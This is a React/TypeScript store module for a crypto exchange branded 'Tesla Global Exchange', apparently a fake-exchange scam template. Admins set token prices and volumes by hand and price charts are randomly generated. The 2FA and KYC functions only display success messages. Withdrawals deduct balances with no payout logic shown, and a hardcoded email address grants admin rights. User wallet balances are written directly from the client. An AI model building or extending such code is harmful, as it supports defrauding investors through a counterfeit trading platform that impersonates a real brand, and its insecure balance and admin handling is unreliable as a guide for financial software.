
import React, { createContext, useContext, useState, useEffect, ReactNode, useRef } from 'react';
import { User, CoinData, NewsItem, CustomTokenConfig, Order, OrderType, TradeType, AssetBalance, AccountType, Transaction, Language, CandleData, MiningRig, SystemSettings, ChatMessage } from '../types';
import { translations } from '../services/i18n';
import { supabase } from '../lib/supabase';

interface Notification {
  id: string;
  type: 'success' | 'error' | 'info';
  message: string;
}

interface StoreContextType {
  currentUser: User | null;
  allUsers: User[];
  login: (email: string, password: string) => Promise<boolean>;
  register: (email: string, password: string, code: string, inviteCode?: string) => Promise<boolean>;
  logout: () => void;
  sendVerificationCode: (email: string) => Promise<boolean>;
  bindExternalWallet: (address: string) => void;
  verifyKYC: () => void;
  submitKYC: () => void;
  toggle2FA: () => void;
  
  notifications: Notification[];
  showNotification: (type: 'success' | 'error' | 'info', message: string) => void;
  removeNotification: (id: string) => void;

  marketData: CoinData[];
  candleData: Record<string, CandleData[]>;
  refreshMarketData: () => Promise<void>;
  generateCandles: (basePrice: number, timeframe?: string) => CandleData[];
  formatPrice: (price: number) => string;
  
  customToken: CustomTokenConfig;
  deployedTokens: CustomTokenConfig[];
  updateCustomToken: (symbol: string, config: Partial<CustomTokenConfig>) => Promise<void>;
  issueNewToken: (config: CustomTokenConfig) => Promise<void>;
  deleteToken: (symbol: string) => Promise<void>;
  
  news: NewsItem[];
  addNews: (news: NewsItem) => void;
  
  systemSettings: SystemSettings;
  updateSystemSettings: (settings: Partial<SystemSettings>) => void;

  chatMessages: ChatMessage[];
  sendChatMessage: (text: string) => void;

  miningRigs: MiningRig[];
  updateMiningRig: (rigId: string, updates: Partial<MiningRig>) => void;

  placeOrder: (symbol: string, type: OrderType, tradeType: TradeType, price: number, amount: number, leverage: number, triggerPrice?: number) => Promise<boolean>;
  userOrders: Order[];
  userTransactions: Transaction[];
  cancelOrder: (orderId: string) => Promise<void>;
  
  deposit: (userId: string, symbol: string, amount: number) => Promise<void>;
  withdraw: (userId: string, symbol: string, amount: number) => Promise<boolean>;
  transfer: (userId: string, symbol: string, amount: number, from: AccountType, to: AccountType) => Promise<boolean>;
  mine: (userId: string) => void;
  boostHashrate: (userId: string) => void;
  buyRig: (userId: string, rig: MiningRig) => boolean;
  addRigToUser: (userId: string, rig: MiningRig) => void;
  claimAirdrop: (userId: string) => boolean;
  
  updateUser: (userId: string, data: Partial<User>) => void;
  adminUpdateUserPassword: (userId: string, newPass: string) => Promise<void>;
  deleteUser: (userId: string) => void;
  
  fetchPendingDeposits: () => Promise<Transaction[]>;
  approveDeposit: (txId: string, action: 'APPROVE' | 'REJECT') => Promise<void>;

  language: Language;
  setLanguage: (lang: Language) => void;
  t: (key: string) => string;
  
  isLoading: boolean;
}

const StoreContext = createContext<StoreContextType | undefined>(undefined);

const initialCustomToken: CustomTokenConfig = {
  symbol: 'TESLA', name: 'Tesla Coin', price: 0.075, priceChangePercent: 5.24, supply: 100000000, volume24h: 5000000,
  description: 'The official governance token of the Tesla Global Exchange ecosystem.', enabled: true,
  contractAddress: '0x123...abc', minWithdraw: 10, feeRate: 0.001, logoUrl: 'https://via.placeholder.com/64/0ea5e9/ffffff?text=T'
};

const initialSystemSettings: SystemSettings = {
    telegram: 'https://t.me/tslaglobal', twitter: 'https://twitter.com/tslaglobal',
    discord: 'https://discord.gg/tsla', supportEmail: 'support@tsla-global.com',
    announcementBar: 'Welcome to Tesla Global Exchange'
};

const defaultRigs: MiningRig[] = [
    { id: 'rig_1', name: 'AntMiner S9', hashrate: 15, cost: 5, dailyOutput: 5, purchasedDate: '' },
    { id: 'rig_2', name: 'WhatsMiner M30', hashrate: 45, cost: 12, dailyOutput: 18, purchasedDate: '' },
    { id: 'rig_3', name: 'AntMiner S19 Pro', hashrate: 110, cost: 35, dailyOutput: 50, purchasedDate: '' }
];

const coinIcons: Record<string, string> = {
    btc: 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png',
    eth: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png',
    usdt: 'https://assets.coingecko.com/coins/images/325/large/Tether.png',
    tesla: 'https://via.placeholder.com/64/0ea5e9/ffffff?text=T'
};

const fallbackMarketData: CoinData[] = [
  { id: 'bitcoin', symbol: 'btc', name: 'Bitcoin', image: coinIcons.btc, current_price: 64230.50, market_cap: 1200000000000, market_cap_rank: 1, fully_diluted_valuation: null, total_volume: 35000000000, high_24h: 65100, low_24h: 63800, price_change_24h: 1234.56, price_change_percentage_24h: 1.85, circulating_supply: 19000000, total_supply: 21000000, max_supply: 21000000, ath: 73700, atl: 65, isCustom: false },
  { id: 'ethereum', symbol: 'eth', name: 'Ethereum', image: coinIcons.eth, current_price: 3450.78, market_cap: 400000000000, market_cap_rank: 2, fully_diluted_valuation: null, total_volume: 15000000000, high_24h: 3520, low_24h: 3380, price_change_24h: -45.67, price_change_percentage_24h: -1.2, circulating_supply: 120000000, total_supply: 120000000, max_supply: null, ath: 4800, atl: 0.4, isCustom: false },
  { id: 'tether', symbol: 'usdt', name: 'Tether', image: coinIcons.usdt, current_price: 1.00, market_cap: 103000000000, market_cap_rank: 3, fully_diluted_valuation: null, total_volume: 50000000000, high_24h: 1.001, low_24h: 0.999, price_change_24h: 0.00, price_change_percentage_24h: 0.00, circulating_supply: 103000000000, total_supply: 103000000000, max_supply: null, ath: 1.01, atl: 0.99, isCustom: false },
];

export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const [currentUser, setCurrentUser] = useState<User | null>(null);
  const [allUsers, setAllUsers] = useState<User[]>([]);
  
  const [marketData, setMarketData] = useState<CoinData[]>(fallbackMarketData);
  const [deployedTokens, setDeployedTokens] = useState<CustomTokenConfig[]>([]);
  const [customToken, setCustomToken] = useState<CustomTokenConfig>(initialCustomToken);
  const [news, setNews] = useState<NewsItem[]>([]);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  
  // Initialize Mining Rigs from LocalStorage to persist changes
  const [miningRigs, setMiningRigs] = useState<MiningRig[]>(() => {
      const saved = localStorage.getItem('tesla_mining_rigs');
      return saved ? JSON.parse(saved) : defaultRigs;
  });

  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [language, setLanguage] = useState<Language>('en');
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [systemSettings, setSystemSettings] = useState<SystemSettings>(initialSystemSettings);
  
  const [userOrders, setUserOrders] = useState<Order[]>([]);
  const [userTransactions, setUserTransactions] = useState<Transaction[]>([]);

  // Persist Mining Rigs whenever they change
  useEffect(() => {
      localStorage.setItem('tesla_mining_rigs', JSON.stringify(miningRigs));
  }, [miningRigs]);

  const t = (key: string) => translations[language][key] || key;

  // Price formatter helper
  const formatPrice = (price: number) => {
      if (price === 0 || price === null || price === undefined) return '0.00';
      if (price < 0.000001) return price.toFixed(10);
      if (price < 0.001) return price.toFixed(8);
      if (price < 1) return price.toFixed(6);
      if (price < 10) return price.toFixed(4);
      return price.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  const showNotification = (type: 'success' | 'error' | 'info', message: string) => {
    const id = Math.random().toString(36).substr(2, 9);
    setNotifications(prev => [...prev, { id, type, message }]);
    setTimeout(() => removeNotification(id), 1500);
  };
  const removeNotification = (id: string) => setNotifications(prev => prev.filter(n => n.id !== id));

  const mapProfileToUser = (profile: any): User => ({
      id: profile.id,
      email: profile.email,
      isAdmin: profile.is_admin || profile.email === 'polo8503@icloud.com', 
      isFrozen: profile.is_frozen || false,
      kycLevel: profile.kyc_level || 0,
      riskLevel: profile.risk_level || 'LOW',
      feeRate: profile.fee_rate || 0.001,
      fundingWallet: Array.isArray(profile.funding_wallet) ? profile.funding_wallet : [],
      tradingWallet: Array.isArray(profile.trading_wallet) ? profile.trading_wallet : [],
      miningBalance: profile.mining_balance || 0,
      hashrate: profile.hashrate || 0,
      rigs: Array.isArray(profile.rigs) ? profile.rigs : [],
      inviteCode: profile.invite_code || '',
      referralCount: profile.referral_count || 0,
      referralEarnings: profile.referral_earnings || 0,
      lastLogin: new Date().toISOString(),
      registerDate: profile.created_at
  });

  const fetchProfile = async () => {
      try {
          const { data: { user } } = await supabase.auth.getUser();
          if (user) {
              const { data: profile } = await supabase.from('profiles').select('*').eq('id', user.id).single();
              if (profile) {
                  const mappedUser = mapProfileToUser(profile);
                  setCurrentUser(mappedUser);
                  if (mappedUser.isAdmin) fetchAllUsers();
              }
          } else {
              setCurrentUser(null);
          }
      } catch (e) {
          console.error("Profile fetch error", e);
      }
  };

  useEffect(() => {
      fetchProfile();
      refreshMarketData(); 
      const channel = supabase.channel('public:profiles')
          .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'profiles' }, 
          (payload) => {
              if (currentUser && payload.new.id === currentUser.id) {
                   setCurrentUser(mapProfileToUser(payload.new));
              }
          })
          .subscribe();
      return () => { supabase.removeChannel(channel); };
  }, [currentUser?.id]);

  const login = async (email: string, password: string): Promise<boolean> => {
      const { error } = await supabase.auth.signInWithPassword({ email, password });
      if (error) { showNotification('error', error.message); return false; }
      showNotification('success', 'Login Successful');
      fetchProfile();
      return true;
  };

  const register = async (email: string, password: string, _code: string, inviteCode?: string): Promise<boolean> => {
      const { error } = await supabase.auth.signUp({ email, password, options: { data: { invite_code: inviteCode } } });
      if (error) { showNotification('error', error.message); return false; }
      showNotification('success', 'Confirmation email sent!');
      return true;
  };

  const logout = async () => {
      await supabase.auth.signOut();
      setCurrentUser(null);
      setAllUsers([]);
      showNotification('info', 'Logged out');
  };
  
  const sendVerificationCode = async (_email: string): Promise<boolean> => {
      showNotification('info', 'Check email for link.');
      return true;
  };

  const fetchAllUsers = async () => {
      if (!currentUser?.isAdmin) return;
      const { data } = await supabase.from('profiles').select('*').order('created_at', { ascending: false });
      if (data) setAllUsers(data.map(mapProfileToUser));
  };

  const fetchPendingDeposits = async (): Promise<Transaction[]> => {
      if (!currentUser?.isAdmin) return [];
      const { data } = await supabase.from('transactions').select('*').eq('status', 'PENDING').eq('type', 'DEPOSIT');
      return data || [];
  };

  const approveDeposit = async (txId: string, action: 'APPROVE' | 'REJECT') => {
      if (!currentUser?.isAdmin) return;
      const { data: tx } = await supabase.from('transactions').select('*').eq('id', txId).single();
      if (!tx) return;

      if (action === 'APPROVE') {
          const { data: profile } = await supabase.from('profiles').select('*').eq('id', tx.user_id).single();
          if (profile) {
              const newWallet = Array.isArray(profile.funding_wallet) ? [...profile.funding_wallet] : [];
              const asset = newWallet.find((a: any) => a.symbol === tx.symbol);
              if (asset) asset.amount += Number(tx.amount);
              else newWallet.push({ symbol: tx.symbol, amount: Number(tx.amount), frozen: 0 });

              await supabase.from('profiles').update({ funding_wallet: newWallet }).eq('id', tx.user_id);
              await supabase.from('transactions').update({ status: 'COMPLETED' }).eq('id', txId);
              showNotification('success', 'Deposit Approved');
          }
      } else {
          await supabase.from('transactions').update({ status: 'FAILED' }).eq('id', txId);
          showNotification('info', 'Deposit Rejected');
      }
      fetchPendingDeposits();
  };

  const deposit = async (userId: string, symbol: string, amount: number) => {
      const { error } = await supabase.from('transactions').insert({ user_id: userId, type: 'DEPOSIT', symbol, amount, status: 'PENDING' });
      if (!error) {
          showNotification('success', 'Deposit Request Submitted');
          const tx: Transaction = { id: Date.now().toString(), userId, type: 'DEPOSIT', symbol, amount, status: 'PENDING', date: new Date().toISOString() };
          setUserTransactions(prev => [tx, ...prev]);
      }
      else showNotification('error', 'Failed to submit deposit');
  };

  const withdraw = async (userId: string, symbol: string, amount: number): Promise<boolean> => {
     if (!currentUser) return false;
     const fundingWallet = Array.isArray(currentUser.fundingWallet) ? [...currentUser.fundingWallet] : [];
     const asset = fundingWallet.find(a => a.symbol === symbol);
     
     if (!asset || asset.amount < amount) {
         showNotification('error', 'Insufficient funds in Funding Account');
         return false;
     }

     asset.amount -= amount;
     
     // Update user balance first
     const { error } = await supabase.from('profiles').update({ funding_wallet: fundingWallet }).eq('id', userId);
     
     if (error) {
         showNotification('error', 'Withdrawal failed');
         return false;
     }

     showNotification('info', 'Withdrawal Submitted'); 
     const tx: Transaction = { id: Date.now().toString(), userId, type: 'WITHDRAW', symbol, amount, status: 'PENDING', date: new Date().toISOString() };
     setUserTransactions(prev => [tx, ...prev]);
     return true;
  };

  const transfer = async (userId: string, symbol: string, amount: number, from: AccountType, to: AccountType): Promise<boolean> => {
      if (!currentUser) return false;
      const fromKey = from === 'FUNDING' ? 'fundingWallet' : 'tradingWallet';
      const toKey = to === 'FUNDING' ? 'fundingWallet' : 'tradingWallet';
      const fromDBKey = from === 'FUNDING' ? 'funding_wallet' : 'trading_wallet';
      const toDBKey = to === 'FUNDING' ? 'funding_wallet' : 'trading_wallet';

      const fromWallet = Array.isArray(currentUser[fromKey]) ? [...currentUser[fromKey]] : [];
      const toWallet = Array.isArray(currentUser[toKey]) ? [...currentUser[toKey]] : [];
      
      const src = fromWallet.find(a => a.symbol === symbol);
      if (!src || src.amount < amount) { showNotification('error', 'Insufficient Balance'); return false; }
      
      src.amount -= amount;
      const dst = toWallet.find(a => a.symbol === symbol);
      if (dst) dst.amount += amount; else toWallet.push({ symbol, amount, frozen: 0 });

      const { error } = await supabase.from('profiles').update({ [fromDBKey]: fromWallet, [toDBKey]: toWallet }).eq('id', userId);
      if (!error) { 
          showNotification('success', 'Transfer Success'); 
          fetchProfile(); 
          const tx: Transaction = { id: Date.now().toString(), userId, type: 'TRANSFER', symbol, amount, status: 'COMPLETED', date: new Date().toISOString() };
          setUserTransactions(prev => [tx, ...prev]);
          return true; 
      }
      return false;
  };

  const updateUser = async (userId: string, data: Partial<User>) => {
      const dbUpdate: any = {};
      if (data.fundingWallet) dbUpdate.funding_wallet = data.fundingWallet;
      if (data.tradingWallet) dbUpdate.trading_wallet = data.tradingWallet;
      if (data.miningBalance !== undefined) dbUpdate.mining_balance = data.miningBalance;
      if (data.hashrate !== undefined) dbUpdate.hashrate = data.hashrate;
      if (data.rigs !== undefined) dbUpdate.rigs = data.rigs;
      if (data.isFrozen !== undefined) dbUpdate.is_frozen = data.isFrozen;
      if (data.kycLevel !== undefined) dbUpdate.kyc_level = data.kycLevel;
      if (data.riskLevel !== undefined) dbUpdate.risk_level = data.riskLevel;
      if (data.feeRate !== undefined) dbUpdate.fee_rate = data.feeRate;
      if (data.externalWalletAddress !== undefined) dbUpdate.external_wallet_address = data.externalWalletAddress;
      
      const { error } = await supabase.from('profiles').update(dbUpdate).eq('id', userId);
      
      if (!error) {
          showNotification('success', 'User Updated');
          fetchAllUsers();
      } else {
          showNotification('error', 'Update Failed');
      }
  };

  const adminUpdateUserPassword = async (_userId: string, _newPass: string) => {
      await new Promise(resolve => setTimeout(resolve, 1000));
      showNotification('success', 'Password Update Requested (Simulation)');
  };

  const deleteUser = async (userId: string) => {
      await supabase.from('profiles').delete().eq('id', userId);
      showNotification('success', 'User Deleted');
      fetchAllUsers();
  };
  
  const bindExternalWallet = (address: string) => { 
      if(currentUser) {
          updateUser(currentUser.id, { externalWalletAddress: address });
          showNotification('success', 'Wallet Address Updated'); 
      }
  };
  const verifyKYC = () => { showNotification('success', 'KYC Submitted'); };
  const submitKYC = () => { verifyKYC(); };
  const toggle2FA = () => { showNotification('success', '2FA Updated'); };
  const mine = (_uid: string) => {}; 
  const boostHashrate = (_uid: string) => {}; 
  const buyRig = (userId: string, rig: MiningRig) => {
      const user = currentUser; // Use current user directly since this runs client-side for immediate feedback
      if(!user) return false;
      
      const funding = Array.isArray(user.fundingWallet) ? [...user.fundingWallet] : [];
      const usdt = funding.find(a => a.symbol === 'USDT');
      
      if (!usdt || usdt.amount < rig.cost) { 
          showNotification('error', 'Insufficient USDT in Funding Wallet'); 
          return false; 
      }
      
      usdt.amount -= rig.cost; 
      const newRigs = [...(user.rigs || []), rig]; 
      const newHashrate = (user.hashrate || 0) + rig.hashrate;
      
      updateUser(userId, { fundingWallet: funding, rigs: newRigs, hashrate: newHashrate }); 
      
      const tx: Transaction = { id: Date.now().toString(), userId, type: 'RIG_PURCHASE', symbol: 'USDT', amount: rig.cost, status: 'COMPLETED', date: new Date().toISOString() };
      setUserTransactions(prev => [tx, ...prev]);
      
      showNotification('success', `Purchased ${rig.name}!`); 
      return true;
  };

  const addRigToUser = (userId: string, rig: MiningRig) => {
      const user = allUsers.find(u => u.id === userId);
      if(!user) return;
      const newRigs = [...(user.rigs || []), rig];
      const newHashrate = (user.hashrate || 0) + rig.hashrate;
      updateUser(userId, { rigs: newRigs, hashrate: newHashrate });
  };
  const claimAirdrop = (_uid: string) => true; 
  
  const placeOrder = async (symbol: string, type: OrderType, tradeType: TradeType, price: number, amount: number, leverage: number, triggerPrice?: number) => { 
      if (!currentUser) return false;
      
      const wallet = Array.isArray(currentUser.tradingWallet) ? [...currentUser.tradingWallet] : [];
      const totalCost = price * amount;
      
      if (type === OrderType.BUY) {
          const usdt = wallet.find(a => a.symbol === 'USDT');
          if (!usdt || usdt.amount < totalCost) { showNotification('error', 'Insufficient USDT in Trading Wallet'); return false; }
          usdt.amount -= totalCost;
          // In simulation, we assume immediate fill for Market orders, so we don't freeze funds indefinitely
          // For Limit orders, funds should technically be frozen.
          // usdt.frozen = (usdt.frozen || 0) + totalCost; 
      } else {
          const coin = wallet.find(a => a.symbol === symbol);
          if (!coin || coin.amount < amount) { showNotification('error', `Insufficient ${symbol.toUpperCase()} in Trading Wallet`); return false; }
          coin.amount -= amount;
          // coin.frozen = (coin.frozen || 0) + amount;
      }

      // Simulate Immediate Fill if Market Order
      const status = 'FILLED'; // Simplify to always fill for better UX demo unless we build a matching engine
      
      if (status === 'FILLED') {
          if (type === OrderType.BUY) {
              const coin = wallet.find(a => a.symbol === symbol);
              if(coin) coin.amount += amount;
              else wallet.push({ symbol: symbol, amount: amount, frozen: 0 });
          } else {
              const usdt = wallet.find(a => a.symbol === 'USDT');
              if(usdt) usdt.amount += totalCost;
              else wallet.push({ symbol: 'USDT', amount: totalCost, frozen: 0 });
          }
      }

      const newOrder: Order = { id: Math.random().toString(36).substr(2, 9), userId: currentUser.id, symbol, type, tradeType, priceType: price > 0 ? 'LIMIT' : 'MARKET', price, amount, total: totalCost, leverage, triggerPrice, timestamp: Date.now(), status };
      setUserOrders(prev => [newOrder, ...prev]);
      await updateUser(currentUser.id, { tradingWallet: wallet });
      
      // Add Transaction record for Asset History
      const txType = type === OrderType.BUY ? 'TRADE_BUY' : 'TRADE_SELL';
      const tx: Transaction = {
          id: Date.now().toString(),
          userId: currentUser.id,
          type: txType,
          symbol: type === OrderType.BUY ? symbol : 'USDT',
          amount: type === OrderType.BUY ? amount : totalCost,
          price: price,
          status: 'COMPLETED',
          date: new Date().toISOString()
      };
      setUserTransactions(prev => [tx, ...prev]);

      showNotification('success', `Order Filled: ${type} ${amount} ${symbol}`); 
      return true; 
  };

  const cancelOrder = async (orderId: string) => {
      if (!currentUser) return;
      const order = userOrders.find(o => o.id === orderId);
      if (!order || order.status !== 'OPEN') return;

      const wallet = Array.isArray(currentUser.tradingWallet) ? [...currentUser.tradingWallet] : [];
      if (order.type === OrderType.BUY) {
          const usdt = wallet.find(a => a.symbol === 'USDT');
          if (usdt) { 
              usdt.frozen = Math.max(0, (usdt.frozen || 0) - order.total); 
              usdt.amount += order.total; 
          }
      } else {
          const coin = wallet.find(a => a.symbol === order.symbol);
          if (coin) { 
              coin.frozen = Math.max(0, (coin.frozen || 0) - order.amount); 
              coin.amount += order.amount; 
          }
      }

      await updateUser(currentUser.id, { tradingWallet: wallet });
      setUserOrders(prev => prev.map(o => o.id === orderId ? { ...o, status: 'CANCELLED' } : o));
      showNotification('success', 'Order Cancelled');
  };
  
  const issueNewToken = async (config: CustomTokenConfig) => {
      const { error } = await supabase.from('custom_tokens').insert({
          symbol: config.symbol, 
          name: config.name, 
          price: config.price, 
          supply: config.supply, 
          logo_url: config.logoUrl, 
          description: config.description,
          contract_address: config.contractAddress,
          price_change_percent: config.priceChangePercent,
          volume_24h: config.volume24h
      });

      const localTokens = JSON.parse(localStorage.getItem('tesla_custom_tokens') || '[]');
      const filtered = localTokens.filter((t: any) => t.symbol !== config.symbol);
      filtered.push(config);
      localStorage.setItem('tesla_custom_tokens', JSON.stringify(filtered));

      if(!error) { showNotification('success', 'Token Issued'); } 
      else { showNotification('success', 'Token Issued (Local Mode)'); }
      
      await refreshMarketData();
  };
  
  const deleteToken = async (symbol: string) => {
      await supabase.from('custom_tokens').delete().eq('symbol', symbol);
      const localTokens = JSON.parse(localStorage.getItem('tesla_custom_tokens') || '[]');
      const filtered = localTokens.filter((t: any) => t.symbol !== symbol);
      localStorage.setItem('tesla_custom_tokens', JSON.stringify(filtered));
      showNotification('success', 'Token Deleted'); 
      await refreshMarketData();
  };

  const updateCustomToken = async (symbol: string, config: Partial<CustomTokenConfig>) => {
      const dbUpdate: any = {};
      if (config.price !== undefined) dbUpdate.price = config.price;
      if (config.priceChangePercent !== undefined) dbUpdate.price_change_percent = config.priceChangePercent;
      if (config.volume24h !== undefined) dbUpdate.volume_24h = config.volume24h;
      
      await supabase.from('custom_tokens').update(dbUpdate).eq('symbol', symbol);
      
      const localTokens = JSON.parse(localStorage.getItem('tesla_custom_tokens') || '[]');
      const updatedLocal = localTokens.map((t: any) => t.symbol === symbol ? {...t, ...config} : t);
      localStorage.setItem('tesla_custom_tokens', JSON.stringify(updatedLocal));

      showNotification('success', 'Token Updated'); 
      await refreshMarketData();
  };

  const updateMiningRig = (rigId: string, updates: Partial<MiningRig>) => {
      setMiningRigs(prev => prev.map(r => r.id === rigId ? {...r, ...updates} : r));
      showNotification('success', 'Rig Config Updated');
  };

  const refreshMarketData = async () => {
      const localTokens = JSON.parse(localStorage.getItem('tesla_custom_tokens') || '[]');
      const { data: dbTokens } = await supabase.from('custom_tokens').select('*').order('created_at', { ascending: false });
      
      let mergedTokens: any[] = [];
      if (dbTokens && dbTokens.length > 0) mergedTokens = dbTokens; else mergedTokens = localTokens; 

      const customCoins: CoinData[] = [];
      const deployed: CustomTokenConfig[] = [];
      
      let latestToken = customToken;
      let tokenChanged = false;

      mergedTokens.forEach((t: any, index: number) => {
          const symbol = t.symbol || 'UNKNOWN';
          const tokenId = `${symbol.toLowerCase()}-token`;
          const price = Number(t.price || 0);
          const supply = Number(t.supply || 0);
          const change = Number(t.price_change_percent || t.priceChangePercent || 0);
          const volume = Number(t.volume_24h || t.volume24h || price * 50000);
          
          const coinData: CoinData = {
              id: tokenId, 
              symbol: symbol.toLowerCase(), 
              name: t.name || symbol,
              image: t.logo_url || t.logoUrl || `https://via.placeholder.com/64/0EA5E9/FFFFFF?text=${symbol[0]}`,
              current_price: price, 
              market_cap: price * supply, 
              market_cap_rank: 999,
              fully_diluted_valuation: null,
              total_volume: volume, 
              high_24h: price * 1.05, 
              low_24h: price * 0.95, 
              price_change_24h: price * (change / 100), 
              price_change_percentage_24h: change,
              circulating_supply: supply, 
              total_supply: supply, 
              max_supply: supply,
              ath: price * 1.2, 
              atl: price * 0.8, 
              sparkline_in_7d: { price: Array(168).fill(price) }, 
              isCustom: true
          };
          
          if (!customCoins.find(c => c.id === tokenId)) {
              customCoins.push(coinData);
          }
          
          const config: CustomTokenConfig = {
              symbol: symbol, 
              name: t.name, 
              price: price,
              priceChangePercent: change, 
              supply: supply,
              volume24h: volume,
              description: t.description || '', 
              enabled: true, 
              contractAddress: t.contract_address || t.contractAddress,
              logoUrl: t.logo_url || t.logoUrl
          };
          deployed.push(config);
          
          if (index === 0 && config.symbol !== customToken.symbol) {
              latestToken = config;
              tokenChanged = true;
          }
      });

      setDeployedTokens(deployed);
      if(tokenChanged) setCustomToken(latestToken); 

      let publicCoins: CoinData[] = [];
      try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=true');
        if (res.ok) {
            const raw = await res.json();
            publicCoins = raw.map((c: any) => ({ ...c, image: c.image || coinIcons[c.symbol.toLowerCase()] || 'https://via.placeholder.com/64' }));
        }
      } catch (e) {
          publicCoins = fallbackMarketData;
      }

      setMarketData([...customCoins, ...publicCoins]);
      setIsLoading(false);
  };
  
  const generateCandles = (basePrice: number, timeframe: string = '15m'): CandleData[] => { 
      const candles: CandleData[] = []; 
      let current = basePrice; 
      const now = Math.floor(Date.now()/1000); 
      let iv = 15*60; 
      if(timeframe==='1H') iv=3600; 
      if(timeframe==='4H') iv=14400; 
      if(timeframe==='1D') iv=86400; 
      
      for(let i=0; i<100; i++) { 
          const time = (now - (i*iv)); // Keep as number
          const vol = current*0.015; 
          const close = current; 
          const open = current-(Math.random()-0.5)*vol; 
          const high = Math.max(open,close)+Math.random()*(vol*0.4); 
          const low = Math.min(open,close)-Math.random()*(vol*0.4); 
          const volume = Math.random()*1000; 
          candles.unshift({time, open, high, low, close, volume}); 
          current=open; 
      } 
      return candles; 
  };

  const sendChatMessage = (text: string) => {
      setChatMessages(prev => [...prev, { user: currentUser?.email || 'Guest', text, time: new Date().toLocaleTimeString() }]);
  };

  useEffect(() => { refreshMarketData(); }, []);
  const addNews = (item: NewsItem) => setNews(p => [item, ...p]);
  const updateSystemSettings = (s: Partial<SystemSettings>) => setSystemSettings(p => ({...p, ...s}));

  return (
    <StoreContext.Provider value={{
      currentUser, allUsers, login, register, logout, sendVerificationCode, bindExternalWallet, verifyKYC, submitKYC, toggle2FA,
      notifications, showNotification, removeNotification, marketData, candleData: {}, refreshMarketData, generateCandles, formatPrice,
      customToken, updateCustomToken, news, addNews, systemSettings, updateSystemSettings, placeOrder, userOrders, userTransactions,
      cancelOrder, deposit, withdraw, transfer, mine, boostHashrate, buyRig, addRigToUser, claimAirdrop, updateUser, adminUpdateUserPassword, deleteUser,
      fetchPendingDeposits, approveDeposit, issueNewToken, deleteToken, deployedTokens, 
      miningRigs, updateMiningRig,
      chatMessages, sendChatMessage,
      language, setLanguage, t, isLoading
    }}>
      {children}
    </StoreContext.Provider>
  );
};
export const useStore = () => { const context = useContext(StoreContext); if (!context) throw new Error("useStore must be used within StoreProvider"); return context; };
